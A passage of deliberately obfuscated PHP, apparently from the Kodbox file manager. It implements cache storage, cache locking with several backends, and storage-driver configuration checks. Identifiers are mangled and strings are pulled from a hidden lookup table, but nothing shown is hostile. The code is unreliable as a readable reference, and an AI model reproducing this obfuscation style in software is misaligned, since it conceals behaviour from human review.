self::$memoryCache = !1; } public static function key($Ô¨º¡Ø˜) { if (is_array($Ô¨º¡Ø˜) || is_object($Ô¨º¡Ø˜)) { $Ô¨º¡Ø˜ = json_encode($Ô¨º¡Ø˜); } $Ô¨º¡Ø˜ = rawurlencode($Ô¨º¡Ø˜); return md5(KOD_SITE_ID . $_SERVER[¿ÈˆÑ¸ä][11] . $Ô¨º¡Ø˜); } public static function get($ß¿·îÍ, $ãÓ¬¢¯® = false) { $µãùÚŸß = self::key($ß¿·îÍ); $àû¡êË‹ = self::init(); if ($ãÓ¬¢¯®) { return unserialize($àû¡êË‹->get($µãùÚŸß)); } if (!isset(self::$memoryCache[$µãùÚŸß])) { $Æ¸—¦² = $àû¡êË‹->get($µãùÚŸß); self::$memoryCache[$µãùÚŸß] = unserialize($Æ¸—¦²); } return self::$memoryCache[$µãùÚŸß]; } public static function set($æÂ˜¬üˆ, $›´¥âôÌ, $À´§óÌñ = false) { $ÒÊ¹üæÃ =& $_SERVER[¿ÈˆÑ¸ä]; $ŒæĞóÕŠ = self::key($æÂ˜¬üˆ); if (isset(self::$memoryCache[$ŒæĞóÕŠ]) && self::$memoryCache[$ŒæĞóÕŠ] === $›´¥âôÌ) { return !0; } if ($À´§óÌñ === 0) { self::$memoryCache[$ŒæĞóÕŠ] = $›´¥âôÌ; return !0; } $’ã³£ú = self::init(); $¤Á“Ìúª = serialize($›´¥âôÌ); CacheLock::lock($æÂ˜¬üˆ . $ÒÊ¹üæÃ[923]); $ä¼ãÌ‰Á = $’ã³£ú->set($ŒæĞóÕŠ, $¤Á“Ìúª, $À´§óÌñ); self::$memoryCache[$ŒæĞóÕŠ] = $›´¥âôÌ; CacheLock::unlock($æÂ˜¬üˆ . $ÒÊ¹üæÃ[923]); return $ä¼ãÌ‰Á; } public static function getCall($¯©¥ğûë, $±…ğ‘—, $ÍºöëÕÈ, $„ŠŠŒ” = array()) { $…ãäÁ¶Š =& $_SERVER[¿ÈˆÑ¸ä]; $ÉÃÎñÂ = self::get($¯©¥ğûë); if ($ÉÃÎñÂ || $ÉÃÎñÂ === $…ãäÁ¶Š[12]) { return $ÉÃÎñÂ; } $ÉÃÎñÂ = call_user_func_array($ÍºöëÕÈ, $„ŠŠŒ”); $ÉÃÎñÂ = $ÉÃÎñÂ ? $ÉÃÎñÂ : $…ãäÁ¶Š[12]; self::set($¯©¥ğûë, $ÉÃÎñÂ, $±…ğ‘—); return $ÉÃÎñÂ; } public static function limitCall($Ö“¸Ğ„½, $İ„Â¾¤È = 15, $‘„¬†Ä = 30, $å€†ÏëĞ = true) { $å„¨×ª =& $_SERVER[¿ÈˆÑ¸ä]; static $Èå•Ğàì = array(); if ($å€†ÏëĞ) { $Ö“¸Ğ„½ = $Ö“¸Ğ„½ . $å„¨×ª[924] . KodUser::id() . $å„¨×ª[925] . get_client_ip(); } if (isset($Èå•Ğàì[$Ö“¸Ğ„½]) && is_array($Èå•Ğàì[$Ö“¸Ğ„½])) { return $Èå•Ğàì[$Ö“¸Ğ„½][$å„¨×ª[333]] <= $‘„¬†Ä; } $ÔèÍ·”£ = self::get($Ö“¸Ğ„½); if (!is_array($ÔèÍ·”£) || time() - $ÔèÍ·”£[$å„¨×ª[205]] > $İ„Â¾¤È) { $ÔèÍ·”£ = array($å„¨×ª[205] => time(), $å„¨×ª[333] => 0); } $ÔèÍ·”£[$å„¨×ª[333]]++; self::set($Ö“¸Ğ„½, $ÔèÍ·”£, $İ„Â¾¤È); $Èå•Ğàì[$Ö“¸Ğ„½] = $ÔèÍ·”£; return $ÔèÍ·”£[$å„¨×ª[333]] <= $‘„¬†Ä; } public static function limitRuntime($…ûàÍ‘ï, $ÃŠ¡ñà”) { $»»¼ïµæ = $_SERVER[¿ÈˆÑ¸ä][926] . $…ûàÍ‘ï; if (isset(self::$runTimeCache[$»»¼ïµæ]) || !$ÃŠ¡ñà”) { return !0; } $âÒ¶½¡Ø = intval(self::get($»»¼ïµæ)); $âÒ¶½¡Ø = !$âÒ¶½¡Ø || $âÒ¶½¡Ø <= 0 ? 1 : $âÒ¶½¡Ø + 1; if ($âÒ¶½¡Ø > $ÃŠ¡ñà”) { return !1; } self::$runTimeCache[$»»¼ïµæ] = !0; self::set($»»¼ïµæ, $âÒ¶½¡Ø, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $ù“À‰Æ => $úØ¢—™‡) { $Ì¥‹õƒì = intval(self::get($ù“À‰Æ)); $Ì¥‹õƒì = !$Ì¥‹õƒì || $Ì¥‹õƒì <= 1 ? 0 : $Ì¥‹õƒì - 1; self::set($ù“À‰Æ, $Ì¥‹õƒì, 3600); } self::$runTimeCache = array(); } public static function remove($¶ë¯‹µÓ) { $¦è…øËà = self::key($¶ë¯‹µÓ); unset(self::$memoryCache[$¦è…øËà]); self::clearTimeout(); CacheLock::lock($¶ë¯‹µÓ); $Æ½¨ç†– = self::init()->remove($¦è…øËà); CacheLock::unlock($¶ë¯‹µÓ); return $Æ½¨ç†–; } public static function removeMemory($“»áÕƒ·) { $¯Ğœ¸Ó = self::key($“»áÕƒ·); unset(self::$memoryCache[$¯Ğœ¸Ó]); } public static function clearMemory($å·…·¼¥ = false) { if ($å·…·¼¥) { $å·…·¼¥ = self::key($å·…·¼¥); unset(self::$memoryCache[$å·…·¼¥]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¿ÈˆÑ¸ä][927])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¿ÈˆÑ¸ä][928])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($§³×äêÕ, $ªæ°¡ôÊ) { $¡Éİì—† =& $_SERVER[¿ÈˆÑ¸ä]; $this->cachePath = $§³×äêÕ[$¡Éİì—†[87]]; $this->prefix = $¡Éİì—†[929]; $this->cacheTime = $ªæ°¡ôÊ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($­î™„ÙÅ) { $ ŒšÅÅ =& $_SERVER[¿ÈˆÑ¸ä]; $­î™„ÙÅ = str_replace(array($ ŒšÅÅ[930], $ ŒšÅÅ[98], $ ŒšÅÅ[76]), $ ŒšÅÅ[931], $­î™„ÙÅ); return $this->cachePath . $ ŒšÅÅ[932] . $­î™„ÙÅ . $ ŒšÅÅ[933]; } public function set($ï·æÍÄ, $ĞÇÇ†Ú¶, $ÑÔÂ²ıµ = false) { $ÑÔÂ²ıµ = $ÑÔÂ²ıµ ? $ÑÔÂ²ıµ : $this->cacheTime; $çıôóç— = $this->getFile($ï·æÍÄ); if (file_put_contents($çıôóç—, $this->prefix . $ĞÇÇ†Ú¶, LOCK_EX)) { @touch($çıôóç—, intval(time() + $ÑÔÂ²ıµ)); clearstatcache(); return !0; } @unlink($çıôóç—); return !1; } public function get($¶é÷Öğ) { $¸Ú¿šœ = $this->getFile($¶é÷Öğ); if (file_exists($¸Ú¿šœ) && filemtime($¸Ú¿šœ) < time()) { @unlink($¸Ú¿šœ); return !1; } $ˆö”–³Ó = @file_get_contents($¸Ú¿šœ); return substr($ˆö”–³Ó, strlen($this->prefix)); } public function remove($ÒšéÍ½ª) { $ş¡Éùï = $this->getFile($ÒšéÍ½ª); return @unlink($ş¡Éùï); } public function deleteAll() { $–‰àëµ =& $_SERVER[¿ÈˆÑ¸ä]; $ÎÁÖ²æğ = scandir($this->cachePath); foreach ($ÎÁÖ²æğ as $ÃÁÃôÕ) { $œ™Ÿª‡¹ = $this->cachePath . $ÃÁÃôÕ; if (strpos($œ™Ÿª‡¹, $–‰àëµ[933]) && strpos($œ™Ÿª‡¹, $–‰àëµ[934])) { @unlink($œ™Ÿª‡¹); } } } public function clearTimeout() { $Âè€ÀüÔ =& $_SERVER[¿ÈˆÑ¸ä]; $ğ½”šè‡ = scandir($this->cachePath); foreach ($ğ½”šè‡ as $Ùş±Û) { $Âˆ†ŞıÆ = $this->cachePath . $Ùş±Û; if (strpos($Âˆ†ŞıÆ, $Âè€ÀüÔ[933]) && strpos($Âˆ†ŞıÆ, $Âè€ÀüÔ[934]) && filemtime($Âˆ†ŞıÆ) < time()) { @unlink($Âˆ†ŞıÆ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Ç„½€ù =& $_SERVER[¿ÈˆÑ¸ä]; if (self::$handle) { return self::$handle; } $È–ûÓ = $GLOBALS[$Ç„½€ù[6]][$Ç„½€ù[425]]; self::$timeout = $È–ûÓ[$Ç„½€ù[935]] ? $È–ûÓ[$Ç„½€ù[935]] : 10; $ŠÙÏñ = _get($GLOBALS[$Ç„½€ù[6]], $Ç„½€ù[936]); $äºóË˜ = $È–ûÓ[$Ç„½€ù[918]] ? $È–ûÓ[$Ç„½€ù[918]] : $Ç„½€ù[231]; if ($äºóË˜ == $Ç„½€ù[21] && $ŠÙÏñ == $Ç„½€ù[13]) { $äºóË˜ = $Ç„½€ù[231]; } switch ($äºóË˜) { case $Ç„½€ù[921]: self::$handle = new CacheLockRedis(); break; case $Ç„½€ù[922]: self::$handle = new CacheLockMemcached(); break; case $Ç„½€ù[21]: self::$handle = new CacheLockDatabase(); break; case $Ç„½€ù[231]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ç„½€ù[937], $Ç„½€ù[938]); } return self::$handle; } private static function key($–²Ü«îÌ) { return $_SERVER[¿ÈˆÑ¸ä][939] . Cache::key($–²Ü«îÌ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($»È­°¿› = '') { self::$errorMsg = $»È­°¿›; } public static function lockGlobal($–Ï„ëú, $«—­æ) { return self::lock($–Ï„ëú, $«—­æ, !0); } public static function lock($ÑĞ•ÒÈ½, $ê‘ŸÙô› = false, $ÂĞ¼šª¹ = false) { $’ìš¾Âô =& $_SERVER[¿ÈˆÑ¸ä]; $ËÉ¬ÍÀ˜ = self::init(); $­¬‹’µ = self::key($ÑĞ•ÒÈ½); $ê‘ŸÙô› = $ê‘ŸÙô› ? $ê‘ŸÙô› : self::$timeout; $õÖ’ä©• = timeFloat(); if (_get($GLOBALS, $’ìš¾Âô[940], !1)) { if (!$ËÉ¬ÍÀ˜->lock($­¬‹’µ, 0.2)) { die; } return !0; } $…÷ë£¬˜ = $ËÉ¬ÍÀ˜->lock($­¬‹’µ, $ê‘ŸÙô›); $è®¼üúø = timeFloat(); if (!$…÷ë£¬˜) { $Ö‘Ü„’ = "\154\x6f\143\153\x20\145\x72\162\157\162\x3b\x6b\145\171\75{$ÑĞ•ÒÈ½}\x3b\x74\151\x6d\x65\x3d{$ê‘ŸÙô›}\x3b" . self::$errorMsg . $’ìš¾Âô[74] . get_caller_msg(); $Ù”ÚíÜˆ = LNG($’ìš¾Âô[941]) . "\50{$ê‘ŸÙô›}\163\x29\x2e" . LNG($’ìš¾Âô[942]); $Ù”ÚíÜˆ .= $’ìš¾Âô[943]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Ù”ÚíÜˆ = $Ù”ÚíÜˆ . $’ìš¾Âô[944] . self::$errorMsg; } write_log($’ìš¾Âô[945] . sprintf($’ìš¾Âô[946], timeFloat() - $õÖ’ä©•) . $’ìš¾Âô[947] . $Ö‘Ü„’ . $’ìš¾Âô[948] . json_encode(error_get_last()), $’ìš¾Âô[938]); show_json($Ù”ÚíÜˆ, !1); } if (!$ÂĞ¼šª¹) { self::$lockItem[$­¬‹’µ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¹ÓàƒÈ¨ = number_format(timeFloat() - $è®¼üúø, 3); write_log($’ìš¾Âô[949] . $ÑĞ•ÒÈ½ . $’ìš¾Âô[950] . $¹ÓàƒÈ¨, $’ìš¾Âô[938]); } return $…÷ë£¬˜; } public static function lockGet($‡Ôşë·è) { $á´¦–Íá = self::key($‡Ôşë·è); if (self::$lockItem[$á´¦–Íá]) { return self::$lockItem[$á´¦–Íá]; } return self::init()->lockGet($á´¦–Íá); } public static function unlock($Şƒ°øö) { $¦¬¬×´„ =& $_SERVER[¿ÈˆÑ¸ä]; $„ì‰Œ = self::key($Şƒ°øö); self::$lockItem[$„ì‰Œ] = null; self::init()->unlock($„ì‰Œ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¦¬¬×´„[951] . $Şƒ°øö, $¦¬¬×´„[938]); } return; } public static function unlockRuntime() { $ŒëÜ‹šõ =& $_SERVER[¿ÈˆÑ¸ä]; $Î¥ï†äÚ = self::init(); $á¶Ó¤®© = !1; foreach (self::$lockItem as $È¸ñ¼»¶ => $çö‰–Ã) { if (!$çö‰–Ã) { continue; } $Î¥ï†äÚ->unlock($È¸ñ¼»¶); if (!$á¶Ó¤®©) { $á¶Ó¤®© = !0; write_log($ŒëÜ‹šõ[952] . $È¸ñ¼»¶ . $ŒëÜ‹šõ[74] . get_caller_msg(), $ŒëÜ‹šõ[938]); continue; } write_log($ŒëÜ‹šõ[952] . $È¸ñ¼»¶, $ŒëÜ‹šõ[938]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÛÔ„ÓÎé = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ŒëÜ‹šõ[953] . $ÛÔ„ÓÎé . $ŒëÜ‹šõ[954] . ACTION, $ŒëÜ‹šõ[938]); } } public static function fileLock($…ëúüØ) { $¿ãöÙ¡Œ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$GLOBALS[$¿ãöÙ¡Œ[955]]) { $GLOBALS[$¿ãöÙ¡Œ[955]] = array(); } $GLOBALS[$¿ãöÙ¡Œ[955]][$…ëúüØ] = !1; $È°‰œÁÀ = fopen(DATA_PATH . $…ëúüØ . $¿ãöÙ¡Œ[956], $¿ãöÙ¡Œ[957]); if (!$È°‰œÁÀ) { return !1; } $GLOBALS[$¿ãöÙ¡Œ[955]][$…ëúüØ] = $È°‰œÁÀ; if (flock($È°‰œÁÀ, LOCK_EX)) { return !0; } self::unlock($…ëúüØ); show_json($¿ãöÙ¡Œ[958], !1); return !1; } public static function fileUnlock($ĞÍš‘í‡) { $ôÖ¬Ö‚ =& $_SERVER[¿ÈˆÑ¸ä]; $‹òä·àÁ = $GLOBALS[$ôÖ¬Ö‚[955]][$ĞÍš‘í‡]; if (!$‹òä·àÁ) { return; } $GLOBALS[$ôÖ¬Ö‚[955]][$ĞÍš‘í‡] = !1; flock($‹òä·àÁ, LOCK_UN); fclose($‹òä·àÁ); } public static function fileUnlockAll() { $“ùßÒÅ† =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($GLOBALS[$“ùßÒÅ†[955]]) || !$GLOBALS[$“ùßÒÅ†[955]]) { return; } foreach ($GLOBALS[$“ùßÒÅ†[955]] as $úÂ êÇ => $’™³¢É) { if (!$’™³¢É) { continue; } $GLOBALS[$“ùßÒÅ†[955]][$úÂ êÇ] = !1; flock($’™³¢É, LOCK_UN); fclose($’™³¢É); } $GLOBALS[$“ùßÒÅ†[955]] = array(); } } goto Aó™åÃ“ˆ; a¼à‰êµ¡±: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\x73\157\165\162\143\145\x53\145\143\162\x65\x74\114\x69\x73\164"; public $field = array("\163\157\x75\x72\x63\145\111\x44", "\x74\x79\x70\145\x49\104", "\x63\162\145\x61\164\145\x55\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x73\164\157\x72\141\147\145\x4c\151\163\164"; public $field = array("\156\141\155\145", "\163\x69\x7a\x65\115\141\170", "\x73\171\x73\164\145\x6d", "\x64\145\x66\141\x75\154\x74", "\x64\162\x69\166\x65\x72", "\x63\157\x6e\146\151\x67"); public function listData($˜Ûû† = false, $Æ­ÍˆİÈ = "\155\157\x64\151\x66\x79\124\151\155\x65", $½½™àÚı = false) { $ÍØÕÛˆó =& $_SERVER[¿ÈˆÑ¸ä]; $Áï¢ïêã = parent::listData($˜Ûû†, $Æ­ÍˆİÈ, $½½™àÚı); if ($˜Ûû†) { return $Áï¢ïêã; } $Ä¸ß‚õ³ = array(); if ($GLOBALS[$ÍØÕÛˆó[2456]]) { $Ä¸ß‚õ³ = $this->ioSizeUseGet(array_to_keyvalue($Áï¢ïêã, $ÍØÕÛˆó[12], $ÍØÕÛˆó[483])); } foreach ($Áï¢ïêã as $úéºÉš => $¶°ã¯üô) { unset($Áï¢ïêã[$úéºÉš][$ÍØÕÛˆó[6]]); $Áï¢ïêã[$úéºÉš][$ÍØÕÛˆó[2111]] = isset($Ä¸ß‚õ³[$¶°ã¯üô[$ÍØÕÛˆó[483]]]) ? $Ä¸ß‚õ³[$¶°ã¯üô[$ÍØÕÛˆó[483]]] : 0; } return $Áï¢ïêã; } public function ioSizeUseGet($½™”¢Ê”) { $Í¦“‘ä§ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$½™”¢Ê”) { return array(); } $å¼»Ôîû = $Í¦“‘ä§[2457] . implode($Í¦“‘ä§[50], $½™”¢Ê”); $ÖÙ¡ı¶í = Cache::get($å¼»Ôîû); if ($ÖÙ¡ı¶í) { return $ÖÙ¡ı¶í; } $éÕ·™‚ = array($Í¦“‘ä§[909] => $Í¦“‘ä§[483], $Í¦“‘ä§[2458] => $Í¦“‘ä§[79]); $÷ó½İä‘ = array($Í¦“‘ä§[909] => array($Í¦“‘ä§[7], $½™”¢Ê”)); $ÖÙ¡ı¶í = Model($Í¦“‘ä§[877])->field($éÕ·™‚)->where($÷ó½İä‘)->group($Í¦“‘ä§[909])->select(); $ÖÙ¡ı¶í = array_to_keyvalue($ÖÙ¡ı¶í, $Í¦“‘ä§[483], $Í¦“‘ä§[79]); Cache::set($å¼»Ôîû, $ÖÙ¡ı¶í, 600); return $ÖÙ¡ı¶í; } public function getConfig($„°²°»ø) { $öúöú•ç = parent::listData($„°²°»ø); $¼ïéõû = _get($öúöú•ç, $_SERVER[¿ÈˆÑ¸ä][6], array()); if ($¼ïéõû && !is_array($¼ïéõû)) { $¼ïéõû = json_decode($¼ïéõû, !0); } return $¼ïéõû; } public function update($˜‘è‡®, $­·ÁÕ†ì) { $Š—üĞ¢ş =& $_SERVER[¿ÈˆÑ¸ä]; $ĞÇÀ·‡š = $­·ÁÕ†ì[$Š—üĞ¢ş[32]]; $ÒÒÈŞôü = array_to_keyvalue(parent::listData(), $Š—üĞ¢ş[32]); if (isset($ÒÒÈŞôü[$ĞÇÀ·‡š]) && $ÒÒÈŞôü[$ĞÇÀ·‡š][$Š—üĞ¢ş[483]] != $˜‘è‡®) { return !1; } $this->checkPwd($˜‘è‡®, $­·ÁÕ†ì); if (isset($­·ÁÕ†ì[$Š—üĞ¢ş[2459]]) && $­·ÁÕ†ì[$Š—üĞ¢ş[2459]] == $Š—üĞ¢ş[91]) { $this->checkConfig($­·ÁÕ†ì); } unset($­·ÁÕ†ì[$Š—üĞ¢ş[2459]]); $ä€½êÃ = parent::update($˜‘è‡®, $­·ÁÕ†ì); if ($ä€½êÃ && $­·ÁÕ†ì[$Š—üĞ¢ş[37]]) { foreach ($ÒÒÈŞôü as $èÎÃÏÍï) { if ($èÎÃÏÍï[$Š—üĞ¢ş[37]] && $èÎÃÏÍï[$Š—üĞ¢ş[483]] != $˜‘è‡®) { parent::update($èÎÃÏÍï[$Š—üĞ¢ş[483]], array($Š—üĞ¢ş[37] => 0)); } } $this->updateBackup($˜‘è‡®, $ÒÒÈŞôü); } return $ä€½êÃ; } public function add($Î´ÑÕÊŠ) { $¸¼°¶˜Â =& $_SERVER[¿ÈˆÑ¸ä]; $ÖÖÁÁ£­ = array_to_keyvalue(parent::listData(), $¸¼°¶˜Â[32]); if (isset($ÖÖÁÁ£­[$Î´ÑÕÊŠ[$¸¼°¶˜Â[32]]])) { return !1; } $this->checkConfig($Î´ÑÕÊŠ); $÷ØÃáÇ” = parent::insert($Î´ÑÕÊŠ); if ($÷ØÃáÇ” && $Î´ÑÕÊŠ[$¸¼°¶˜Â[37]]) { foreach ($ÖÖÁÁ£­ as $¨Š­ÀÏÕ) { if ($¨Š­ÀÏÕ[$¸¼°¶˜Â[37]]) { parent::update($¨Š­ÀÏÕ[$¸¼°¶˜Â[483]], array($¸¼°¶˜Â[37] => 0)); } } $this->updateBackup($÷ØÃáÇ”, $ÖÖÁÁ£­); } return $÷ØÃáÇ”; } public function updateBackup($µ ¨–Ñ, $‹òœ³”) { $×§âÖú« =& $_SERVER[¿ÈˆÑ¸ä]; if ($µ ¨–Ñ == $×§âÖú«[91]) { return; } $ã¼¼êÅ¤ = Model($×§âÖú«[831])->config(); $·ßı‰ß… = $ã¼¼êÅ¤[$×§âÖú«[835]]; if ($ã¼¼êÅ¤[$×§âÖú«[1886]] != $×§âÖú«[91] || $·ßı‰ß… == $µ ¨–Ñ) { return; } if ($·ßı‰ß… != $×§âÖú«[91]) { $ƒï÷íŞ€ = array(); foreach ($‹òœ³” as $íÉİ±Üæ) { if ($µ ¨–Ñ == $íÉİ±Üæ[$×§âÖú«[483]]) { continue; } $ƒï÷íŞ€[] = $íÉİ±Üæ[$×§âÖú«[483]]; } if ($ƒï÷íŞ€ && in_array($·ßı‰ß…, $ƒï÷íŞ€)) { return; } } $âİ»ğ = Model($×§âÖú«[856])->get($×§âÖú«[863]); $âİ»ğ = json_decode($âİ»ğ, !0); if (!$âİ»ğ) { return; } $âİ»ğ[$×§âÖú«[835]] = $µ ¨–Ñ; Model($×§âÖú«[856])->set(array($×§âÖú«[863] => $âİ»ğ)); } public function checkPwd($€‰ò»‚, &$Ã…Ê„Âø) { $ç¢åä•ˆ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($Ã…Ê„Âø[$ç¢åä•ˆ[6]])) { return; } $×ÚÌØ£ = $Ã…Ê„Âø[$ç¢åä•ˆ[6]]; if (!is_array($×ÚÌØ£)) { $×ÚÌØ£ = json_decode($×ÚÌØ£, !0); } $İÕğº‡ = $ç¢åä•ˆ[12]; $ë–µ¾ı = array($ç¢åä•ˆ[1577], $ç¢åä•ˆ[2460], $ç¢åä•ˆ[989]); foreach ($ë–µ¾ı as $¦ÅÛòêó) { if (isset($×ÚÌØ£[$¦ÅÛòêó])) { $İÕğº‡ = $¦ÅÛòêó; break; } } if (!$İÕğº‡) { return; } $óÚ¼¼åÎ = $this->getConfig($€‰ò»‚); $ªÕ—‚ã· = $óÚ¼¼åÎ[$İÕğº‡]; $ïÂ¢Á®Ò = $×ÚÌØ£[$İÕğº‡]; if ($ïÂ¢Á®Ò == str_repeat($ç¢åä•ˆ[221], strlen($ªÕ—‚ã·))) { $×ÚÌØ£[$İÕğº‡] = $ªÕ—‚ã·; $Ã…Ê„Âø[$ç¢åä•ˆ[6]] = json_encode($×ÚÌØ£); } else { if ($ïÂ¢Á®Ò != $ªÕ—‚ã·) { $Ã…Ê„Âø[$ç¢åä•ˆ[2459]] = $ç¢åä•ˆ[91]; } } } public function checkConfig(&$¾Ïİü®Ì, $—®¥Ä×å = false) { $¨º‹Ó› =& $_SERVER[¿ÈˆÑ¸ä]; $ŒŠÁœ›à = strtolower($¾Ïİü®Ì[$¨º‹Ó›[96]]); $ĞÌ×ÅÖ = $¾Ïİü®Ì[$¨º‹Ó›[6]]; if (!is_array($ĞÌ×ÅÖ)) { $ĞÌ×ÅÖ = json_decode($ĞÌ×ÅÖ, !0); } foreach ($ĞÌ×ÅÖ as $ìøÂ†™’ => $×ûçÈñ¯) { if (is_string($×ûçÈñ¯)) { $ĞÌ×ÅÖ[$ìøÂ†™’] = trim($×ûçÈñ¯); } } $ĞÌ×ÅÖ[$¨º‹Ó›[2461]] = rand_string(6); $ÎâŒî§¾ = $GLOBALS[$¨º‹Ó›[6]][$¨º‹Ó›[92]][$¨º‹Ó›[917]]; $£üŞËü = isset($ÎâŒî§¾[$ŒŠÁœ›à]) ? $ÎâŒî§¾[$ŒŠÁœ›à] : ucfirst($ŒŠÁœ›à); $Ç‡Ë°¤‰ = $¨º‹Ó›[77] . $£üŞËü; if (!$£üŞËü || !class_exists($Ç‡Ë°¤‰)) { if ($—®¥Ä×å) { return LNG($¨º‹Ó›[2462]); } write_log(array($¨º‹Ó›[2463], $¾Ïİü®Ì, get_caller_info()), $¨º‹Ó›[214]); show_json(LNG($¨º‹Ó›[2462]), !1, $¾Ïİü®Ì); } $º ò·ï– = new $Ç‡Ë°¤‰($ĞÌ×ÅÖ); $†ŸĞºÅ² = rtrim($ĞÌ×ÅÖ[$¨º‹Ó›[1302]], $¨º‹Ó›[8]) . $¨º‹Ó›[8]; if (in_array($ŒŠÁœ›à, $º ò·ï–->objectDriver)) { try { if (!$º ò·ï–->isBucketCors() && !$º ò·ï–->setBucketCors()) { $¹Ú±ƒàÊ = LNG($¨º‹Ó›[2464]); $¹Ú±ƒàÊ .= $¨º‹Ó›[2465] . LNG($¨º‹Ó›[2466]); } } catch (Exception $–ÌåÙ”„) { $¹Ú±ƒàÊ = $–ÌåÙ”„->getMessage(); } if (isset($¹Ú±ƒàÊ)) { return $this->_parseError($¹Ú±ƒàÊ, $ŒŠÁœ›à, $—®¥Ä×å); } if ($ŒŠÁœ›à == $¨º‹Ó›[68] && !$º ò·ï–->checkRegion()) { return $this->_parseError(LNG($¨º‹Ó›[2467]), $ŒŠÁœ›à, $—®¥Ä×å); } } else { if ($ŒŠÁœ›à == $¨º‹Ó›[2468]) { if ($º ò·ï–->ftpPath) { $¹ßËÆ¤ş = trim($†ŸĞºÅ², $¨º‹Ó›[8]); if (stripos($¹ßËÆ¤ş, trim($º ò·ï–->ftpPath, $¨º‹Ó›[8])) !== 0) { $†ŸĞºÅ² = $º ò·ï–->ftpPath . $¨º‹Ó›[8] . ($¹ßËÆ¤ş ? $¹ßËÆ¤ş . $¨º‹Ó›[8] : $¨º‹Ó›[12]); } } } } $±Å¾ö¢ = $º ò·ï–->getPath($†ŸĞºÅ² . $¨º‹Ó›[1306]); try { if ($ŒŠÁœ›à == $¨º‹Ó›[107]) { $º ò·ï–->mkdir($†ŸĞºÅ²); } $†õØšœ± = $º ò·ï–->mkfile($±Å¾ö¢); if (!$†õØšœ±) { $¹Ú±ƒàÊ = LNG($¨º‹Ó›[2464]); } } catch (Exception $–ÌåÙ”„) { $¹Ú±ƒàÊ = $–ÌåÙ”„->getMessage(); } if (isset($¹Ú±ƒàÊ)) { return $this->_parseError($¹Ú±ƒàÊ, $ŒŠÁœ›à, $—®¥Ä×å); } $ĞÌ×ÅÖ[$¨º‹Ó›[1302]] = $†ŸĞºÅ²; $¾Ïİü®Ì[$¨º‹Ó›[6]] = json_encode($ĞÌ×ÅÖ); $¾Ïİü®Ì[$¨º‹Ó›[96]] = $£üŞËü; return !0; } private function _parseError($ÛøÔÃ, $ŒÊ†ıĞÑ, $ÂƒŒúØÔ = false) { $Û«¦Šº =& $_SERVER[¿ÈˆÑ¸ä]; if ($ŒÊ†ıĞÑ == $Û«¦Šº[68] && stripos($ÛøÔÃ, $Û«¦Šº[2469])) { $‰Ô¹Ç™ü = explode($Û«¦Šº[10], $ÛøÔÃ); $Şôï‘¬ = isset($‰Ô¹Ç™ü[1]) ? $‰Ô¹Ç™ü[1] : $Û«¦Šº[12]; $ğâè§Ğ = array($Û«¦Šº[2470] => LNG($Û«¦Šº[2471]), $Û«¦Šº[2472] => LNG($Û«¦Šº[2473])); if (isset($ğâè§Ğ[$Şôï‘¬])) { $ÛøÔÃ = $ğâè§Ğ[$Şôï‘¬]; } } if (stripos($ÛøÔÃ, $Û«¦Šº[2474]) === 0) { $‘€°Ö„ = strpos($ÛøÔÃ, $Û«¦Šº[176]); if ($‘€°Ö„ === !1) { $‘€°Ö„ = strpos($ÛøÔÃ, $Û«¦Šº[4]); } if ($‘€°Ö„ !== !1) { $ÛøÔÃ = substr($ÛøÔÃ, $‘€°Ö„ + 1); } } $ÛøÔÃ = LNG($Û«¦Šº[1309]) . $ÛøÔÃ; if ($ÂƒŒúØÔ) { return $ÛøÔÃ; } show_json($ÛøÔÃ, !1); } public function driverListSystem() { $°ÉÕİö =& $_SERVER[¿ÈˆÑ¸ä]; $¹µü¹í¡ = parent::listData(); $¤ã‹ğ§‡ = array(); foreach ($¹µü¹í¡ as $ÓÔ’¹ø¢) { unset($ÓÔ’¹ø¢[$°ÉÕİö[232]], $ÓÔ’¹ø¢[$°ÉÕİö[88]]); if (!is_array($ÓÔ’¹ø¢[$°ÉÕİö[6]])) { $ÓÔ’¹ø¢[$°ÉÕİö[6]] = json_decode($ÓÔ’¹ø¢[$°ÉÕİö[6]], !0); } $¤ã‹ğ§‡[] = $ÓÔ’¹ø¢; } return $¤ã‹ğ§‡; } public function defaultDriver() { $âİï¥½Û =& $_SERVER[¿ÈˆÑ¸ä]; $Ì½˜ò¤£ = parent::listData(); $ìÏûš§ˆ = array_filter_by_field($Ì½˜ò¤£, $âİï¥½Û[37], 1); $ìÏûš§ˆ = $ìÏûš§ˆ[0]; if (!$ìÏûš§ˆ) { return array(); } if (!is_array($ìÏûš§ˆ[$âİï¥½Û[6]])) { $ìÏûš§ˆ[$âİï¥½Û[6]] = json_decode($ìÏûš§ˆ[$âİï¥½Û[6]], !0); } return $ìÏûš§ˆ; } public function driverInfo($Ùµ‹¡“») { $ô­·¨ëü =& $_SERVER[¿ÈˆÑ¸ä]; $‡Œ»° = array_to_keyvalue(parent::listData(), $ô­·¨ëü[483]); if (!isset($‡Œ»°[$Ùµ‹¡“»])) { return !1; } $×ªËç« = $‡Œ»°[$Ùµ‹¡“»]; if (!is_array($×ªËç«[$ô­·¨ëü[6]])) { 